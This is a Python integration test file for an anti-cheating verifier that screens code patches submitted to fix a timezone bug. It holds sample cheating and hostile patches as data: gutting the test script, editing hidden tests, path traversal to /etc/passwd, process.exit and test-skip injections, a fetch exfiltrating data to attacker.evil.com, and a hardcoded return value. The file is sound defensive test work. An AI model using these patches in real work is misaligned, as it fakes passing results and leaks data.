"""
System and integration tests for Adversarial Anti-Cheating Engine (Phase 19).
Verifies BoundaryChecker and PrivateHiddenVerifier work together seamlessly to reject malicious or cheating patches.
"""

from pathlib import Path
from unittest.mock import MagicMock
import pytest

from scopelet.capsule.models import CapsuleManifest
from scopelet.patches.boundary_checker import BoundaryChecker
from scopelet.runner import ExecutionResult, IsolatedRunner
from scopelet.verifier.verifier import PrivateHiddenVerifier
from scopelet.verifier.verdict import Verdict


def _setup_timezone_system_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "system_timezone_repo"
    repo.mkdir()
    (repo / "src").mkdir()
    (repo / "src" / "date").mkdir()
    (repo / "tests").mkdir()
    (repo / "tests" / "hidden").mkdir()

    (repo / "src" / "date" / "timezone.ts").write_text(
        "export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "    return timestamp.toISOString().split('T')[0]; // Bug: UTC instead of tz\n"
        "}\n",
        encoding="utf-8",
    )

    (repo / "tests" / "invoice-timezone.test.ts").write_text(
        "import { getInvoiceDate } from '../src/date/timezone';\n"
        "// Repro test\n",
        encoding="utf-8",
    )

    (repo / "tests" / "hidden" / "invoice.hidden.test.ts").write_text(
        "import { getInvoiceDate } from '../../src/date/timezone';\n"
        "// Hidden oracle suite\n",
        encoding="utf-8",
    )
    return repo


def test_anti_cheating_integration_forbidden_files_and_traversal(tmp_path: Path):
    """
    Integration test: Rejection of patches that attempt to modify package configs,
    system files, or hidden test suites.
    """
    repo = _setup_timezone_system_repo(tmp_path)
    mock_runner = MagicMock()

    boundary_checker = BoundaryChecker()
    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)

    adversarial_patches = [
        # 1. Modifying package.json
        (
            "--- a/package.json\n"
            "+++ b/package.json\n"
            "@@ -1,3 +1,3 @@\n"
            "-  \"scripts\": { \"test\": \"jest\" }\n"
            "+  \"scripts\": { \"test\": \"echo SUCCESS\" }\n"
        ),
        # 2. Modifying hidden test file
        (
            "--- a/tests/hidden/invoice.hidden.test.ts\n"
            "+++ b/tests/hidden/invoice.hidden.test.ts\n"
            "@@ -1,2 +1,2 @@\n"
            "-// Hidden oracle suite\n"
            "+// Overwritten hidden suite\n"
        ),
        # 3. Path traversal attack
        (
            "--- a/../../../etc/passwd\n"
            "+++ b/../../../etc/passwd\n"
            "@@ -1,1 +1,1 @@\n"
            "+root:x:0:0:root:/root:/bin/bash\n"
        ),
    ]

    for patch in adversarial_patches:
        # Check boundary checker directly
        assert not boundary_checker.is_valid(patch), "BoundaryChecker must reject forbidden or traversing patches"

        # Check full verifier pipeline
        report = verifier.verify(patch)
        assert report.verdict == Verdict.REJECT
        assert len(report.rejection_reasons) > 0
        mock_runner.run.assert_not_called()


def test_anti_cheating_integration_code_injection_and_tampering(tmp_path: Path):
    """
    Integration test: Rejection of patches injecting process.exit, network exfiltration,
    or test.skip directives before runner execution.
    """
    repo = _setup_timezone_system_repo(tmp_path)
    mock_runner = MagicMock()
    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)

    tampering_patches = [
        # Early process termination
        (
            "--- a/src/date/timezone.ts\n"
            "+++ b/src/date/timezone.ts\n"
            "@@ -1,2 +1,3 @@\n"
            "+process.exit(0);\n"
            " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        ),
        # Test skipping directive
        (
            "--- a/src/date/timezone.ts\n"
            "+++ b/src/date/timezone.ts\n"
            "@@ -1,2 +1,3 @@\n"
            "+describe.skip('skipping test suite', () => {});\n"
            " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        ),
        # Network exfiltration
        (
            "--- a/src/date/timezone.ts\n"
            "+++ b/src/date/timezone.ts\n"
            "@@ -1,2 +1,3 @@\n"
            "+fetch('https://attacker.evil.com/exfil?d=' + timestamp);\n"
            " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        ),
    ]

    for patch in tampering_patches:
        report = verifier.verify(patch)
        assert report.verdict == Verdict.REJECT
        assert len(report.rejection_reasons) > 0
        mock_runner.run.assert_not_called()


def test_anti_cheating_integration_hardcoded_cheat_caught_by_hidden_oracle(tmp_path: Path):
    """
    Integration test: Hardcoded patch satisfies visible repro test but fails on unseen hidden inputs.
    """
    repo = _setup_timezone_system_repo(tmp_path)
    mock_runner = MagicMock()

    hardcoded_patch = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,3 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "-    return timestamp.toISOString().split('T')[0];\n"
        "+    return '2026-10-18'; // Cheat: hardcoded to pass the visible repro test\n"
        " }\n"
    )

    def mock_run_cmd(cmd, cwd, timeout):
        if "invoice-timezone.test" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=0,
                stdout="PASS: 2026-10-18 matches expected",
                stderr="",
                duration_ms=40,
                backend="local_sandbox",
                tree_hash="h1",
                timed_out=False,
            )
        elif "hidden" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=1,
                stdout="FAIL: Tokyo date expected 2027-01-01 but received 2026-10-18",
                stderr="AssertionError: 2027-01-01 !== 2026-10-18",
                duration_ms=45,
                backend="local_sandbox",
                tree_hash="h2",
                timed_out=False,
            )
        return ExecutionResult(
            command=cmd, exit_code=0, stdout="", stderr="", duration_ms=10,
            backend="local_sandbox", tree_hash="h3", timed_out=False
        )

    mock_runner.run.side_effect = mock_run_cmd
    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)

    report = verifier.verify(
        hardcoded_patch,
        target_cmd="npm test -- invoice-timezone.test",
        hidden_regression_cmd="npm test -- hidden",
    )

    assert report.verdict == Verdict.REJECT
    assert any("Hidden regression test suite failed" in r for r in report.rejection_reasons)
    assert not report.hidden_regression_test.passed


def test_anti_cheating_integration_genuine_fix_accepted(tmp_path: Path):
    """
    Integration test: A genuine, compliant bug fix passes all boundary checks and hidden regression suites.
    """
    repo = _setup_timezone_system_repo(tmp_path)
    mock_runner = MagicMock()

    genuine_patch = (
        "--- a/src/date/timezone.ts\n"
        "+++ b/src/date/timezone.ts\n"
        "@@ -1,3 +1,5 @@\n"
        " export function getInvoiceDate(timestamp: Date, tz: string): string {\n"
        "-    return timestamp.toISOString().split('T')[0];\n"
        "+    const formatter = new Intl.DateTimeFormat('en-CA', { timeZone: tz });\n"
        "+    return formatter.format(timestamp);\n"
        " }\n"
    )

    mock_runner.run.return_value = ExecutionResult(
        command="npm test",
        exit_code=0,
        stdout="All 15 tests passed across visible and hidden suites.",
        stderr="",
        duration_ms=65,
        backend="local_sandbox",
        tree_hash="h_pass",
        timed_out=False,
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(
        genuine_patch,
        target_cmd="npm test -- invoice-timezone.test",
        hidden_regression_cmd="npm test -- hidden",
        full_suite_cmd="npm test",
    )

    assert report.verdict == Verdict.ACCEPT
    assert len(report.rejection_reasons) == 0
    assert report.target_test.passed
    assert report.hidden_regression_test.passed
    assert report.full_test_suite.passed
